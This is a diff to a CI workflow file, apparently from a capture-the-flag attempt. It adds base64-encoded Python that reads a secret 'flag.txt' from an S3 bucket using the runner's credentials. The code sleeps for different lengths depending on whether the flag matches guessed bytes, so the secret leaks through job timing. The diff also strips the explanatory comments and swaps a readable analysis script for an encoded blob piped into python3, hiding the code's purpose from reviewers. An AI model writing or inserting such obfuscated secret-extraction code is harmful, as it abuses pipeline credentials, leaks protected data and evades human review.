@@ -27,12 +27,11 @@ jobs:
 
       - name: Calibrate and verify flag
         run: |
-          # Calibration scripts - sleep(0): measures raw overhead, sleep(4): known baseline
           B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
           B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
           B64_CAL8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg4KQ=="
-          # Full flag comparison: sleep(10) if correct, sleep(2) if wrong
           B64_CMP="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCiAgaWYgZmxhZz09Ynl0ZXMoWzB4NDMsMHg0OSwweDk4LDB4OTMsMHg4NCwweDg2LDB4NDksMHg0MywweDhDLDB4OUMsMHg0NSwweDRBLDB4OEMsMHg5OSwweDg2LDB4ODJdKToKICAgIHRpbWUuc2xlZXAoMTApCiAgZWxzZToKICAgIHRpbWUuc2xlZXAoMikKZXhjZXB0OgogIHBhc3M="
+          B64_ANALYZE="d2l0aCBvcGVuKCJjYWxpYnJhdGUudHh0IikgYXMgZjoKICAgIGxpbmVzID0gW2wuc3RyaXAoKSBmb3IgbCBpbiBmIGlmIGwuc3RyaXAoKV0KZGF0YSA9IHt9CmZvciBsIGluIGxpbmVzOgogICAgbmFtZSwgbXMgPSBsLnJzcGxpdCgiICIsIDEpCiAgICBkYXRhW25hbWVdID0gaW50KG1zLnJzdHJpcCgibXMiKSkKb3ZlcmhlYWQgPSAoZGF0YS5nZXQoImNhbF9zbGVlcDAiLDApICsgZGF0YS5nZXQoImNhbF9zbGVlcDBfMiIsMCkpIC8gMgpwcmludChmIkVzdGltYXRlZCBvdmVyaGVhZCAoUzMrbmV0d29yayk6IHtvdmVyaGVhZDouMGZ9bXMiKQpjYWw0ID0gKGRhdGEuZ2V0KCJjYWxfc2xlZXA0IiwwKSArIGRhdGEuZ2V0KCJjYWxfc2xlZXA0XzIiLDApKSAvIDIKcHJpbnQoZiJDYWxpYnJhdGVkIHNsZWVwKDQpOiB7Y2FsNDouMGZ9bXMgLT4gYWN0dWFsIG92ZXJoZWFkOiB7Y2FsNC00MDAwOi4wZn1tcyIpCmNtcF9tcyA9IGRhdGEuZ2V0KCJmdWxsX2ZsYWdfY21wIiwgMCkKcHJpbnQoZiJGdWxsIGZsYWcgY29tcGFyaXNvbjoge2NtcF9tc31tcyIpCmFkal9jbXAgPSBjbXBfbXMgLSBvdmVyaGVhZApwcmludChmIkFkanVzdGVkIGNvbXBhcmlzb24gKHN1YnRyYWN0IG92ZXJoZWFkKToge2Fkal9jbXA6LjBmfW1zIikKaWYgYWRqX2NtcCA+IDgwMDA6CiAgICBwcmludCgiPj4+IEZMQUcgQ09SUkVDVCAoc2xlZXA9MTBzKSIpCmVsaWYgYWRqX2NtcCA+IDUwMDA6CiAgICBwcmludCgiPj4+IEFNQklHVU9VUyIpCmVsc2U6CiAgICBwcmludCgiPj4+IEZMQUcgV1JPTkcgKHNsZWVwPTJzKSIp"
 
           touch calibrate.txt
 
@@ -57,33 +56,7 @@ jobs:
 
           echo "=== CALIBRATION RESULTS ==="
           cat calibrate.txt
-          python3 << 'EOF'
-with open('calibrate.txt') as f:
-    lines = [l.strip() for l in f if l.strip()]
-data = {}
-for l in lines:
-    name, ms = l.rsplit(' ', 1)
-    data[name] = int(ms.rstrip('ms'))
-
-# Estimate overhead from sleep(0) calls
-overhead = (data.get('cal_sleep0',0) + data.get('cal_sleep0_2',0)) / 2
-print(f"Estimated overhead (S3+network): {overhead:.0f}ms")
-
-cal4 = (data.get('cal_sleep4',0) + data.get('cal_sleep4_2',0)) / 2
-print(f"Calibrated sleep(4): {cal4:.0f}ms → actual overhead: {cal4-4000:.0f}ms")
-
-cmp_ms = data.get('full_flag_cmp', 0)
-print(f"Full flag comparison: {cmp_ms}ms")
-
-adj_cmp = cmp_ms - overhead
-print(f"Adjusted comparison (subtract overhead): {adj_cmp:.0f}ms")
-if adj_cmp > 8000:
-    print(">>> FLAG CORRECT (sleep≈10s)")
-elif adj_cmp > 5000:
-    print(">>> AMBIGUOUS")
-else:
-    print(">>> FLAG WRONG (sleep≈2s)")
-EOF
+          echo "$B64_ANALYZE" | base64 -d | python3
 
       - name: Commit calibration results
         run: |
